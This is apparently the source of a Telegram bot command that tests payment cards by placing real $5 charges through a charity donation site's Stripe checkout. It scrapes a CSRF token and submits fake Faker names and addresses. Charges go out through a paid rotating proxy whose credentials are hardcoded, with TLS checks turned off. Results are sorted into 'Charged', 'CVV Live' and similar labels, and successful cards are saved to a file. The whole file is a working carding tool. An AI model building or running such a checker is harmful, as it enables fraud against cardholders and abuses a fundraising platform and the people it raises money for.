from aiogram import types, Bot, Dispatcher
import aiohttp
import datetime
import config
from config import auth_chats, can_use_b3
import re
import ssl
from faker import Faker
import random
import json
import string
from aiohttp import TCPConnector, BasicAuth
from acc import get_random_pair
from branding import apply_branding
from premium_util import is_premium

fake = Faker()

async def handle_stmass_command(chat_id: int, user_id: int, cc: str, mes: str, ano: str, cvv: str):
    start_time = datetime.datetime.now()

    if chat_id in auth_chats["private"] or chat_id in auth_chats["group"]:
        if not await can_use_b3(chat_id, user_id):
            return apply_branding("Please wait 30 seconds before using /ad again."), None

        # التحقق من المعلومات
        if not all([cc, mes, ano, cvv]):
            return apply_branding("Missing required information."), None

        if len(cc) == 16 and len(cvv) == 3 and mes.isdigit() and ano.isdigit() and len(ano) == 4:
            email = generate_random_email(domain="gmail.com")
            # إرسال البطاقة للفحص
            response_message= await req1(email, chat_id, user_id, cc, mes, ano, cvv, start_time)
            if response_message:
                return response_message
            else:
                return apply_branding("Error"), None

def generate_random_email(domain="example.com", length=10):
    characters = string.ascii_letters + string.digits
    random_part = "".join(random.choice(characters) for i in range(length))
    return f"{random_part}@{domain}"    
  
async def req1(email, chat_id, user_id, cc, mes, ano, cvv, start_time):        

    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.5",
        "cache-control": "max-age=0",
        "dnt": "1",
        "referer": "https://fundly.com/revival-2023?form=popup2",
        "sec-ch-ua": "\"Brave\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "sec-gpc": "1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Telegram / @MRootSu) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    }

    proxy_url = "http://p.webshare.io:80/"
    proxy_auth = BasicAuth("xovqvoju-rotate", "oxptwb4o99hg")

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
        async with session.get("https://fundly.com/", headers=headers) as response:
            response_text = await response.text()
            if "authenticity_token" in response_text:
                token = re.search(r"<meta content=\"([^\"]+)\" name=\"csrf-token\" />", response_text).group(1)
                return await req2(chat_id, user_id, cc, mes, ano, cvv, token, start_time, session, fake, email, proxy_url, proxy_auth)

async def req2(chat_id, user_id, cc, mes, ano, cvv, token, start_time, session, fake, email, proxy_url, proxy_auth):
    acc, id = get_random_pair()
    url = f"https://fundly.com/api/activities/{id}/tokenizations"
    headers = {
    "accept": "*/*",
    "accept-language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "origin": "https://fundly.com",
    "pragma": "no-cache",
    "referer": "https://fundly.com/support-for-baby-cecilia?form=popup",
    "sec-ch-ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "user-agent": "Mozilla/5.0 (Linux; Android 11; Telegram / @MRootSu) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
}

    data = {
        "authenticity_token": token,
        "client_id": "ca_3om6VgjRhNgiY1cQQjqxdM7wDDlgsCcD",
        "name": fake.name(),
        "email": email,
        "amount": 5,
        "tip_amount": "0.25",
        "g_recaptcha_response": None,
        "address_line1": fake.street_address(),
        "address_city": fake.city(),
        "address_state": fake.state_abbr(),
        "address_country": "US",
        "address_zip": fake.zipcode(),
    }

    async with session.post(url, json=data, headers=headers,) as response:
        content_type = response.headers.get("Content-Type")

        if "application/json" in content_type:
            response_data = await response.json()
            if "clientSecret" in response_data:
                clientsecret = response_data["clientSecret"]
                pi = clientsecret.split("_secret_")[0]
                return await req3(chat_id, user_id, cc, mes, ano, cvv, clientsecret, start_time, session, fake, pi, email ,proxy_url ,proxy_auth, acc, id)
        return apply_branding("Error in Request 2"), None

async def extract_transaction_reason(response_data):
    if any(success_indicator in str(response_data).lower() for success_indicator in ["succeeded", "success"]):
        return "Transaction succeeded"
    decline_code = response_data.get("error", {}).get("decline_code", None)
    if decline_code:
        return " ".join(decline_code.split("_")).capitalize()
    message = response_data.get("error", {}).get("message", None)
    if message:
        return message.capitalize()
    if "requires_source_action" in str(response_data).lower():
        return "CAPTCHA"
    return "Unknown error"

async def req3(chat_id, user_id, cc, mes, ano, cvv, clientsecret, start_time, session, fake, pi, email ,proxy_url ,proxy_auth, acc, id):
    headers = {
        "accept": "application/json",
        "accept-language": "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "pragma": "no-cache",
        "referer": "https://js.stripe.com/",
        "sec-ch-ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
}

    data = f"return_url=https%3A%2F%2Ffundly.com%2F&payment_method_data[billing_details][address][postal_code]={fake.zipcode()}&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][name]={fake.name()}&payment_method_data[billing_details][email]={email}&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[referrer]=https%3A%2F%2Ffundly.com&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&expected_payment_method_type=card&key=pk_live_Zgs2hKdvabJqIziCWuJmu7B5&_stripe_account={acc}&client_secret={clientsecret}"
    
    async def fetch_bin_details(session, cc):
        url = "https://api.voidex.dev/api/bin"
        params = {"bin": cc[:6]}
        async with session.get(url, params=params) as response:
            if response.status == 200:
                data = await response.json()
                return data
            return None

    bin_details = await fetch_bin_details(session, cc[:6])
    if bin_details:
        country_name = bin_details.get("country_name", "Unknown")
        country_flag = bin_details.get("country_flag", "Unknown")
        bank = bin_details.get("bank", "Unknown")
        level = bin_details.get("level", "Unknown")
        type_ = bin_details.get("type", "Unknown")
        brand = bin_details.get("brand", "Unknown") 
    else:
        country_name = country_flag = bank = level = type_ = brand = "Unknown"
   
    async with session.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm", data=data, headers=headers, proxy=proxy_url, proxy_auth=proxy_auth) as response:
        response_data = await response.json()
        reason = await extract_transaction_reason(response_data)
        reason_lower = reason.lower()
        end_time = datetime.datetime.now()
        duration = end_time - start_time 
    
    proxy_status = "Dead ❌"
    proxy_encrypted = "Error in Proxy"
        
    try:
        async with aiohttp.ClientSession() as proxy_session:
            async with proxy_session.get("http://httpbin.org/ip", proxy=proxy_url, proxy_auth=proxy_auth, timeout=5) as response:
                if response.status == 200:
                    json_response = await response.json()
                    proxy = json_response["origin"]
                    proxy_status = "Live ✅"
                    proxy_encrypted = proxy[:-6] + "******"
    except Exception:
        pass

    if "succeeded" in reason_lower or "thank you" in reason_lower or "payment successful" in reason_lower or "pass" in reason_lower or "redirect_url" in reason_lower:
        response_status = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅"
    elif "insufficient funds" in reason_lower:
        response_status = "𝐂𝐕𝐕 𝐋𝐢𝐯𝐞 ✅"
    elif "incorrect" in reason_lower and "security code" in reason_lower or "invalid" in reason_lower and "security code" in reason_lower:
        response_status = "𝐂𝐂𝐍 ♻️"
    elif "three_d_secure_redirect" in reason_lower or "stripe_3ds2_fingerprint" in reason_lower:
        response_status = "3D ⚠️"
    else:
        response_status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

    # Determine user status for branding
    premium_status = await is_premium(str(user_id))
    if user_id == config.Admin:
        user_status = "Owner"
    elif premium_status:
        user_status = "Premium"
    else:
        user_status = "Free"
    
    # Get user name safely
    user_mention = f"<a href=\'tg://user?id={user_id}\'>User</a>"

    response_message = apply_branding(
        f"{response_status}\n\n"
        f"<a href=\"http://t.me/IgnisXBot\">•</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
        f"<a href=\"http://t.me/IgnisXBot\">•</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ Stripe Charge\n"
        f"<a href=\"http://t.me/IgnisXBot\">•</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ {reason}\n\n"
        f"<a href=\"http://t.me/IgnisXBot\">•</a> 𝐈𝐧𝐟𝐨 ⌁ {type_} - {level} - {brand}\n"
        f"<a href=\"http://t.me/IgnisXBot\">•</a> 𝐈𝐬𝐬𝐮𝐞𝐫 ⌁ {bank}\n"
        f"<a href=\"http://t.me/IgnisXBot\">•</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {country_name} {country_flag}\n"
        f"<a href=\"http://t.me/IgnisXBot\">•</a> 𝐏𝐫𝐨𝐱𝐲 ⌁ <code>{proxy_encrypted}</code> {proxy_status}\n\n"
        f"𝐓𝐨𝐨𝐤 ⌁ {round(duration.total_seconds(), 2)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
        f"𝐑𝐞𝐪𝐮𝐞𝐬𝐭𝐞𝐝 𝐛𝐲 ⌁ {user_mention} {{<code><b>{user_status}</b></code>}}"
    )

    if response_status == "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅":
        try:
            with open("cards/(stripe)Charge.txt", "a", encoding='utf-8') as file:
                file.write(response_message + "\n\n")
        except Exception:
            pass

    return response_message
